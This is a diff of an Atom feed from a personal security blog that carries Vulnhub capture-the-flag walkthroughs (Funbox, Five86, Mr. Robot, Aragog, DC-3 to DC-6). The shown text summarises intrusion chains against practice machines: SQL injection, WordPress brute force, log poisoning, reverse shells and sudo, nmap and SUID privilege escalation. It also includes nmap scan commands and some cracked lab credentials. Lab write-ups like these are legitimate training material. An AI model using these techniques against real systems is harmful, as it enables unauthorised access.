@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-05T22:47:06+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Raju Talukder</title><subtitle>Just another boring Cyber Security Researcher | Red Teamer</subtitle><author><name>Raju Talukder</name></author><entry><title type="html">Vulnhub Funbox 2 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 2 Walkthrough" /><published>2023-11-17T00:00:00+05:30</published><updated>2023-11-17T00:00:00+05:30</updated><id>http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough/"><![CDATA[<p>This box is very straightforward; there is nothing complex that we need to know about some tools. From the FTP, we obtained numerous zip files encrypted with passwords. We decrypted one user’s files password and found ‘id_rsa’ inside the zip, allowing SSH login into the box. To escalate privileges, we need to find out the users’ passwords, which are stored inside a history file.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-06T12:15:14+06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Raju Talukder</title><subtitle>Just another boring Cyber Security Researcher | Red Teamer</subtitle><author><name>Raju Talukder</name></author><entry><title type="html">Vulnhub Funbox 2 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 2 Walkthrough" /><published>2023-11-17T00:00:00+06:00</published><updated>2023-11-17T00:00:00+06:00</updated><id>http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough/"><![CDATA[<p>This box is very straightforward; there is nothing complex that we need to know about some tools. From the FTP, we obtained numerous zip files encrypted with passwords. We decrypted one user’s files password and found ‘id_rsa’ inside the zip, allowing SSH login into the box. To escalate privileges, we need to find out the users’ passwords, which are stored inside a history file.</p>
 
 <h1 id="information-gathering">Information Gathering</h1>
 
@@ -131,7 +131,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 <p>We can see that the ‘tom’ user has full sudo permission on this box, and now that we have the user’s password, we can simply switch the user to root, and we are now root.</p>
 
-<p><img src="/assets/images/funbox-2/13.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[This box is very straightforward; there is nothing complex that we need to know about some tools. From the FTP, we obtained numerous zip files encrypted with passwords. We decrypted one user’s files password and found ‘id_rsa’ inside the zip, allowing SSH login into the box. To escalate privileges, we need to find out the users’ passwords, which are stored inside a history file.]]></summary></entry><entry><title type="html">Vulnhub Funbox 3 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 3 Walkthrough" /><published>2023-11-17T00:00:00+05:30</published><updated>2023-11-17T00:00:00+05:30</updated><id>http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough/"><![CDATA[<p>This box was quite interesting to me. I found lots of rabbit holes here. Initially, we discovered three applications. The admin application was vulnerable to SQL injection (SQLi), and we successfully bypassed the authentication, but I could not find any way to access the box from there. In the gym application, I did not find anything exploitable. However, the store application was also vulnerable to SQLi, and we successfully dumped the admin credentials and logged into the application.</p>
+<p><img src="/assets/images/funbox-2/13.png" alt="" /></p>]]></content><author><name>Raju Talukder</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the funbox-2 machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub Funbox 3 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 3 Walkthrough" /><published>2023-11-17T00:00:00+06:00</published><updated>2023-11-17T00:00:00+06:00</updated><id>http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough/"><![CDATA[<p>This box was quite interesting to me. I found lots of rabbit holes here. Initially, we discovered three applications. The admin application was vulnerable to SQL injection (SQLi), and we successfully bypassed the authentication, but I could not find any way to access the box from there. In the gym application, I did not find anything exploitable. However, the store application was also vulnerable to SQLi, and we successfully dumped the admin credentials and logged into the application.</p>
 
 <p>The file upload vulnerability was not working for me, so I searched for publicly available exploits and found a Remote Code Execution (RCE) vulnerability. Using the RCE, I obtained credentials for SSH, which led to the initial foothold. Privilege escalation was very straightforward, involving the misuse of permissions. However, we can also obtain root access using the SUID binary.</p>
 
@@ -279,7 +279,7 @@ Finished
 
 <p>And this technique also worked. The ‘id’ command shows that I am still Tony; however, the effective UID is root, so I can perform every task as root.</p>
 
-<p><img src="/assets/images/funbox-3/17.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[This box was quite interesting to me. I found lots of rabbit holes here. Initially, we discovered three applications. The admin application was vulnerable to SQL injection (SQLi), and we successfully bypassed the authentication, but I could not find any way to access the box from there. In the gym application, I did not find anything exploitable. However, the store application was also vulnerable to SQLi, and we successfully dumped the admin credentials and logged into the application.]]></summary></entry><entry><title type="html">Vulnhub Funbox 1 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 1 Walkthrough" /><published>2023-11-12T00:00:00+05:30</published><updated>2023-11-12T00:00:00+05:30</updated><id>http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough/"><![CDATA[<p>I personally found this box quite interesting. To gain the initial foothold, I ran WPScan with a password list, using <code class="language-plaintext highlighter-rouge">rockyou.txt</code> which led to the discovery of two valid user credentials for the web console. One of these users also had SSH access to the box. However, obtaining the shell wasn’t enough; there was an additional step to escape the rbash shell. For root access, post-enumeration was crucial, as there were multiple ways to achieve it. Some methods were relatively straightforward, while others required additional research.</p>
+<p><img src="/assets/images/funbox-3/17.png" alt="" /></p>]]></content><author><name>Raju Talukder</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the funbox-3 machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub Funbox 1 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 1 Walkthrough" /><published>2023-11-12T00:00:00+06:00</published><updated>2023-11-12T00:00:00+06:00</updated><id>http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough/"><![CDATA[<p>I personally found this box quite interesting. To gain the initial foothold, I ran WPScan with a password list, using <code class="language-plaintext highlighter-rouge">rockyou.txt</code> which led to the discovery of two valid user credentials for the web console. One of these users also had SSH access to the box. However, obtaining the shell wasn’t enough; there was an additional step to escape the rbash shell. For root access, post-enumeration was crucial, as there were multiple ways to achieve it. Some methods were relatively straightforward, while others required additional research.</p>
 
 <h1 id="information-gathering">Information Gathering</h1>
 
@@ -437,7 +437,7 @@ admin:iubire
 
 <p><img src="/assets/images/fun-box-1/16.png" alt="" /></p>
 
-<p>Although both binaries are present inside the box, I’ve decided not to pursue them since I already have root access. Skipping the ‘funny’ user’s part, with a bit of luck, we might catch the root reverse-shell on the first attempt. There are multiple ways to achieve root on this machine. I thoroughly enjoyed working on this machine.</p>]]></content><author><name>raju</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[I personally found this box quite interesting. To gain the initial foothold, I ran WPScan with a password list, using rockyou.txt which led to the discovery of two valid user credentials for the web console. One of these users also had SSH access to the box. However, obtaining the shell wasn’t enough; there was an additional step to escape the rbash shell. For root access, post-enumeration was crucial, as there were multiple ways to achieve it. Some methods were relatively straightforward, while others required additional research.]]></summary></entry><entry><title type="html">Vulnhub Five86 1 Walkthrough</title><link href="http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Five86 1 Walkthrough" /><published>2023-11-11T00:00:00+05:30</published><updated>2023-11-11T00:00:00+05:30</updated><id>http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough/"><![CDATA[<p>There are two enabled HTTP services and one SSH service. One of the HTTP services, called ‘opennetadmin,’ is outdated and has a publicly available exploit that provides the initial foothold. To escalate privileges for the first user access, find the ‘.htpassword’ file, which contains the username and password hash with a clue. Abusing the misconfigured ‘copy’ binary gives us the second user access. For the third user access, check the mailbox where you will find the last user’s credentials. At this point, we only need to find the secret game directory and execute a SUID binary to gain root access.</p>
+<p>Although both binaries are present inside the box, I’ve decided not to pursue them since I already have root access. Skipping the ‘funny’ user’s part, with a bit of luck, we might catch the root reverse-shell on the first attempt. There are multiple ways to achieve root on this machine. I thoroughly enjoyed working on this machine.</p>]]></content><author><name>Raju Talukder</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the funbox-1 machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub Five86 1 Walkthrough</title><link href="http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Five86 1 Walkthrough" /><published>2023-11-11T00:00:00+06:00</published><updated>2023-11-11T00:00:00+06:00</updated><id>http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/five86-series/vulnhub-five86-1-walkthrough/"><![CDATA[<p>There are two enabled HTTP services and one SSH service. One of the HTTP services, called ‘opennetadmin,’ is outdated and has a publicly available exploit that provides the initial foothold. To escalate privileges for the first user access, find the ‘.htpassword’ file, which contains the username and password hash with a clue. Abusing the misconfigured ‘copy’ binary gives us the second user access. For the third user access, check the mailbox where you will find the last user’s credentials. At this point, we only need to find the secret game directory and execute a SUID binary to gain root access.</p>
 
 <h1 id="information-gathering">Information Gathering</h1>
 
@@ -546,7 +546,7 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 
 <p>I just run the games and tried with random inputs but it gives me the root access every time so i assume there is nothing based on the input. And i’m root now.</p>
 
-<p><img src="/assets/images/five86-1/17.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Five86-Series" /><summary type="html"><![CDATA[There are two enabled HTTP services and one SSH service. One of the HTTP services, called ‘opennetadmin,’ is outdated and has a publicly available exploit that provides the initial foothold. To escalate privileges for the first user access, find the ‘.htpassword’ file, which contains the username and password hash with a clue. Abusing the misconfigured ‘copy’ binary gives us the second user access. For the third user access, check the mailbox where you will find the last user’s credentials. At this point, we only need to find the secret game directory and execute a SUID binary to gain root access.]]></summary></entry><entry><title type="html">Vulnhub Five86 2 Walkthrough</title><link href="http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Five86 2 Walkthrough" /><published>2023-11-11T00:00:00+05:30</published><updated>2023-11-11T00:00:00+05:30</updated><id>http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough</id><content type="html" xml:base="http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough/"><![CDATA[<p>This is the last machine so far from this five86 series. This series proved to be interesting, offering numerous learning opportunities. Among the publicly available ports, FTP and the web server were present. However, the FTP was well-configured, with nothing initially available. The web application, when scanned using WPScanner, revealed some users and two valid user credential combinations. Upon obtaining the user credentials, logging into the web console and exploiting a simple file upload functionality provided the initial foothold. Password re-use granted the first user privilege. Achieving the second user privilege required executing an ARP poisoning attack. Finally, the third and last step to gain root access involved exploiting a misconfiguration in file super permissions.</p>
+<p><img src="/assets/images/five86-1/17.png" alt="" /></p>]]></content><author><name>Raju Talukder</name></author><category term="Five86-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the five86-1 machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub Five86 2 Walkthrough</title><link href="http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Five86 2 Walkthrough" /><published>2023-11-11T00:00:00+06:00</published><updated>2023-11-11T00:00:00+06:00</updated><id>http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough</id><content type="html" xml:base="http://localhost:4000/five86-series/vulnhub-five86-2-walkthrough/"><![CDATA[<p>This is the last machine so far from this five86 series. This series proved to be interesting, offering numerous learning opportunities. Among the publicly available ports, FTP and the web server were present. However, the FTP was well-configured, with nothing initially available. The web application, when scanned using WPScanner, revealed some users and two valid user credential combinations. Upon obtaining the user credentials, logging into the web console and exploiting a simple file upload functionality provided the initial foothold. Password re-use granted the first user privilege. Achieving the second user privilege required executing an ARP poisoning attack. Finally, the third and last step to gain root access involved exploiting a misconfiguration in file super permissions.</p>
 
 <h1 id="information-gathering">Information Gathering</h1>
 
@@ -727,7 +727,7 @@ stephen:apollo1                                                                 
 
 <p>Upon inspecting Peter’s sudo permissions, I discovered that he can execute the passwd command as root without requiring a password. Exploiting this, I changed the root user’s password and successfully logged in as root with the updated credentials.</p>
 
-<p><img src="/assets/images/five86-2/18.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Five86-Series" /><summary type="html"><![CDATA[This is the last machine so far from this five86 series. This series proved to be interesting, offering numerous learning opportunities. Among the publicly available ports, FTP and the web server were present. However, the FTP was well-configured, with nothing initially available. The web application, when scanned using WPScanner, revealed some users and two valid user credential combinations. Upon obtaining the user credentials, logging into the web console and exploiting a simple file upload functionality provided the initial foothold. Password re-use granted the first user privilege. Achieving the second user privilege required executing an ARP poisoning attack. Finally, the third and last step to gain root access involved exploiting a misconfiguration in file super permissions.]]></summary></entry><entry><title type="html">Vulnhub Mr. Robot 1 Walkthrough</title><link href="http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Mr. Robot 1 Walkthrough" /><published>2023-11-11T00:00:00+05:30</published><updated>2023-11-11T00:00:00+05:30</updated><id>http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough/"><![CDATA[<h1 id="mr-robot-1">Mr. Robot-1</h1>
+<p><img src="/assets/images/five86-2/18.png" alt="" /></p>]]></content><author><name>Raju Talukder</name></author><category term="Five86-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the five86-2 machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub Mr. Robot 1 Walkthrough</title><link href="http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Mr. Robot 1 Walkthrough" /><published>2023-11-11T00:00:00+06:00</published><updated>2023-11-11T00:00:00+06:00</updated><id>http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/tj-null-oscp/vulnhub-mr-robot-1-walkthrough/"><![CDATA[<h1 id="mr-robot-1">Mr. Robot-1</h1>
 
 <p>For the initial foothold, we need to discover the underlying technology of the web application. Upon checking the hidden files or directories, I found that it’s a WordPress web application. Additionally, I found the robots.txt file along with two other files, one of which is a wordlist. We can scan the application through WPScan with the wordlist, which should give us valid administrative user credentials.</p>
 
@@ -872,7 +872,7 @@ Starting gobuster <span class="k">in </span>directory enumeration mode
 
 <p>I ran nmap in interactive mode and successfully received the shell with root privileges.</p>
 
-<p><img src="/assets/images/mr-robot-1/10.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="TJ-Null-OSCP" /><summary type="html"><![CDATA[Mr. Robot-1]]></summary></entry><entry><title type="html">Vulnhub Aragog Walkthrough</title><link href="http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Aragog Walkthrough" /><published>2023-11-10T00:00:00+05:30</published><updated>2023-11-10T00:00:00+05:30</updated><id>http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough</id><content type="html" xml:base="http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough/"><![CDATA[<p>This box is pretty straightforward; nothing complex here. Enumeration is the key. We need to enumerate and use the gathered information at the perfect moment. From the Nmap scan, we found the SSH and HTTP ports open. By visiting the web server, we discovered it’s a WordPress application, and there is a vulnerable plugin, wp-file-manager, which is susceptible to an Unauthenticated Arbitrary File Upload vulnerability. This vulnerability gives us the initial foothold.</p>
+<p><img src="/assets/images/mr-robot-1/10.png" alt="" /></p>]]></content><author><name>Raju Talukder</name></author><category term="TJ-Null-OSCP" /><summary type="html"><![CDATA[Step-by-step walkthrough of the mr-robot-1 machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub Aragog Walkthrough</title><link href="http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Aragog Walkthrough" /><published>2023-11-10T00:00:00+06:00</published><updated>2023-11-10T00:00:00+06:00</updated><id>http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough</id><content type="html" xml:base="http://localhost:4000/harry-potter-series/vulnhub-aragog-walkthrough/"><![CDATA[<p>This box is pretty straightforward; nothing complex here. Enumeration is the key. We need to enumerate and use the gathered information at the perfect moment. From the Nmap scan, we found the SSH and HTTP ports open. By visiting the web server, we discovered it’s a WordPress application, and there is a vulnerable plugin, wp-file-manager, which is susceptible to an Unauthenticated Arbitrary File Upload vulnerability. This vulnerability gives us the initial foothold.</p>
 
 <p>For privilege escalation, the author of this box did not install WordPress in the usual place. We need to find out the configuration file, and from there, we can get the MySQL credentials. Logging into MySQL provides us with the hagrid98 user password hash. Using John, we decrypt the password and log in as the hagrid98 user. Then, we find the cronjob and modify the file to gain root access.</p>
 
@@ -1044,7 +1044,7 @@ Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
 
 <p>I opened the listener and waited for root to execute the file. Within a minute, I got the shell, and I am now root.</p>
 
-<p><img src="/assets/images/aragog/15.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Harry-Potter-Series" /><summary type="html"><![CDATA[This box is pretty straightforward; nothing complex here. Enumeration is the key. We need to enumerate and use the gathered information at the perfect moment. From the Nmap scan, we found the SSH and HTTP ports open. By visiting the web server, we discovered it’s a WordPress application, and there is a vulnerable plugin, wp-file-manager, which is susceptible to an Unauthenticated Arbitrary File Upload vulnerability. This vulnerability gives us the initial foothold.]]></summary></entry><entry><title type="html">Vulnhub DC-6 Walkthrough</title><link href="http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug/" rel="alternate" type="text/html" title="Vulnhub DC-6 Walkthrough" /><published>2023-10-23T00:00:00+05:30</published><updated>2023-10-23T00:00:00+05:30</updated><id>http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug</id><content type="html" xml:base="http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug/"><![CDATA[<p>For the initial foothold, we initiated a password brute-force attack based on a custom-generated password list, following a clue provided by the box’s author. After obtaining the password, we were able to log in to the web application and discovered the activity monitor. A search on Exploit-DB revealed a publicly available exploit that facilitated the initial foothold. While exploring the file system, we discovered a user credential with read, write, and execute permissions, along with the ability to run the file as a different user. Exploiting these permissions granted another user privilege. The new user gained the ability to run ‘nmap’ as root. Leveraging this, we created a simple script and executed it through ‘nmap’ as a superuser, ultimately achieving root access to the box.</p>
+<p><img src="/assets/images/aragog/15.png" alt="" /></p>]]></content><author><name>Raju Talukder</name></author><category term="Harry-Potter-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the aragog machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub DC-6 Walkthrough</title><link href="http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug/" rel="alternate" type="text/html" title="Vulnhub DC-6 Walkthrough" /><published>2023-10-23T00:00:00+06:00</published><updated>2023-10-23T00:00:00+06:00</updated><id>http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug</id><content type="html" xml:base="http://localhost:4000/dc-series/vulnhub-dc-6-walkthroug/"><![CDATA[<p>For the initial foothold, we initiated a password brute-force attack based on a custom-generated password list, following a clue provided by the box’s author. After obtaining the password, we were able to log in to the web application and discovered the activity monitor. A search on Exploit-DB revealed a publicly available exploit that facilitated the initial foothold. While exploring the file system, we discovered a user credential with read, write, and execute permissions, along with the ability to run the file as a different user. Exploiting these permissions granted another user privilege. The new user gained the ability to run ‘nmap’ as root. Leveraging this, we created a simple script and executed it through ‘nmap’ as a superuser, ultimately achieving root access to the box.</p>
 
 <h1 id="information-gathering">Information Gathering</h1>
 <p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
@@ -1170,7 +1170,7 @@ Trying sarah / <span class="o">!</span>lak019b Time: 00:03:55 &lt;<span class="o
 
 <p>In the updated version, the interactive mode is no longer supported, so we need to explore the other option: executing a script. Here, I created a script that will execute the ‘/bin/bash’ command, stored it in the tmp directory as ‘root.nse’, and executed the script, granting me root access.</p>
 
-<p><img src="/assets/images/dc-6/14.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="DC-Series" /><summary type="html"><![CDATA[For the initial foothold, we initiated a password brute-force attack based on a custom-generated password list, following a clue provided by the box’s author. After obtaining the password, we were able to log in to the web application and discovered the activity monitor. A search on Exploit-DB revealed a publicly available exploit that facilitated the initial foothold. While exploring the file system, we discovered a user credential with read, write, and execute permissions, along with the ability to run the file as a different user. Exploiting these permissions granted another user privilege. The new user gained the ability to run ‘nmap’ as root. Leveraging this, we created a simple script and executed it through ‘nmap’ as a superuser, ultimately achieving root access to the box.]]></summary></entry><entry><title type="html">Vulnhub DC-5 Walkthrough</title><link href="http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough/" rel="alternate" type="text/html" title="Vulnhub DC-5 Walkthrough" /><published>2023-10-22T00:00:00+05:30</published><updated>2023-10-22T00:00:00+05:30</updated><id>http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough</id><content type="html" xml:base="http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough/"><![CDATA[<p>This box proved to be quite engaging for me. The initial foothold presented an interesting challenge. Understanding the application’s workflow and identifying a hidden parameter vulnerable to LFI with code execution capabilities was crucial. Since file uploads were not possible, I opted for a log poisoning attack to achieve command injection. This sequence, starting with log poisoning and leading to command injection, allowed for the initial foothold. The privilege escalation was straightforward, involving the exploitation of a SUID binary for which a publicly available exploit already exists.</p>
+<p><img src="/assets/images/dc-6/14.png" alt="" /></p>]]></content><author><name>Raju Talukder</name></author><category term="DC-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the DC-6 machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub DC-5 Walkthrough</title><link href="http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough/" rel="alternate" type="text/html" title="Vulnhub DC-5 Walkthrough" /><published>2023-10-22T00:00:00+06:00</published><updated>2023-10-22T00:00:00+06:00</updated><id>http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough</id><content type="html" xml:base="http://localhost:4000/dc-series/vulnhub-dc-5-walkthrough/"><![CDATA[<p>This box proved to be quite engaging for me. The initial foothold presented an interesting challenge. Understanding the application’s workflow and identifying a hidden parameter vulnerable to LFI with code execution capabilities was crucial. Since file uploads were not possible, I opted for a log poisoning attack to achieve command injection. This sequence, starting with log poisoning and leading to command injection, allowed for the initial foothold. The privilege escalation was straightforward, involving the exploitation of a SUID binary for which a publicly available exploit already exists.</p>
 
 <h1 id="information-gathering">Information Gathering</h1>
 
@@ -1359,102 +1359,204 @@ Full Payload
 
 <p><img src="/assets/images/dc-5/13.png" alt="" /></p>
 
-<p>The privilege escalation was quite easy. There wasn’t anything complex; I just needed to find the right payload, transfer it to the victim computer, make it executable, and execute it. The permissions were then changed to root.</p>]]></content><author><name>Raju Talukder</name></author><category term="DC-Series" /><summary type="html"><![CDATA[This box proved to be quite engaging for me. The initial foothold presented an interesting challenge. Understanding the application’s workflow and identifying a hidden parameter vulnerable to LFI with code execution capabilities was crucial. Since file uploads were not possible, I opted for a log poisoning attack to achieve command injection. This sequence, starting with log poisoning and leading to command injection, allowed for the initial foothold. The privilege escalation was straightforward, involving the exploitation of a SUID binary for which a publicly available exploit already exists.]]></summary></entry><entry><title type="html">Vulnhub DC-4 Walkthrough</title><link href="http://localhost:4000/dc-series/vulnhub-dc-4-walkthrough/" rel="alternate" type="text/html" title="Vulnhub DC-4 Walkthrough" /><published>2023-10-21T00:00:00+05:30</published><updated>2023-10-21T00:00:00+05:30</updated><id>http://localhost:4000/dc-series/vulnhub-dc-4-walkthrough</id><content type="html" xml:base="http://localhost:4000/dc-series/vulnhub-dc-4-walkthrough/"><![CDATA[<p>This box was so easy. There are only two ports open: SSH and the HTTP server. For the initial foothold, we need to attempt a brute force attack on the login form of the web application. After logging into the application, we can intercept the request and modify the commands. The lack of input validation will give us the command injection vulnerability, allowing us to gain the initial foothold into the box. The privilege escalation is also straightforward. We found a stored password list, and there was a valid password for one user, which allowed SSH login. Checking the mail revealed another user’s password who has some super permissions on a file editor. Using these super permissions, we can edit any file, leading to root access.</p>
+<p>The privilege escalation was quite easy. There wasn’t anything complex; I just needed to find the right payload, transfer it to the victim computer, make it executable, and execute it. The permissions were then changed to root.</p>]]></content><author><name>Raju Talukder</name></author><category term="DC-Series" /><summary type="html"><![CDATA[Step-by-step walkthrough of the DC-5 machine from Vulnhub.]]></summary></entry><entry><title type="html">Vulnhub DC-3 Walkthrough</title><link href="http://localhost:4000/dc-series/Vulnhub-dc-3-walkthrough/" rel="alternate" type="text/html" title="Vulnhub DC-3 Walkthrough" /><published>2023-10-20T00:00:00+06:00</published><updated>2023-10-20T00:00:00+06:00</updated><id>http://localhost:4000/dc-series/Vulnhub-dc-3-walkthrough</id><content type="html" xml:base="http://localhost:4000/dc-series/Vulnhub-dc-3-walkthrough/"><![CDATA[<p>This box is really easy, relying entirely on reconnaissance skills. For the initial foothold, we need to identify the CMS and its version. Once the CMS version is identified, there is a known SQL injection vulnerability that leads to obtaining the admin user’s password hash. After decrypting the password, we can log in to the application. A theme allows the execution of PHP code, leading to the initial foothold. The kernel is quite old, and there is a publicly available exploit that grants root access.</p>
 
 <h1 id="information-gathering">Information Gathering</h1>
 
 <p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p22</span>,80 <span class="nt">-sC</span> <span class="nt">-sV</span> 192.168.197.136
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
 
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
-| ssh-hostkey: 
-|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 <span class="o">(</span>RSA<span class="o">)</span>
-|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 <span class="o">(</span>ECDSA<span class="o">)</span>
-|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp open  http    nginx 1.15.10
-|_http-title: System Tools
-|_http-server-header: nginx/1.15.10
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Home
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-generator: Joomla! - Open Source Content Management
 </code></pre></div></div>
 
-<p>From the Nmap scan, I found only two open ports: SSH and the web server. Since there are no credentials, port 22 is not relevant for now. Let’s start hunting through the web server.</p>
+<p>From the nmap output we found only one http service is accessible publicly and the banner tells us it’s a ubuntu machine. The application is generated by joomla Open source content management system. Lets inspect the application manually.</p>
 
 <p><strong>Manual Inspection</strong></p>
 
-<p><img src="/assets/images/dc-4/1.png" alt="" /></p>
+<p><img src="/assets/images/dc-3/10.png" alt="" /></p>
 
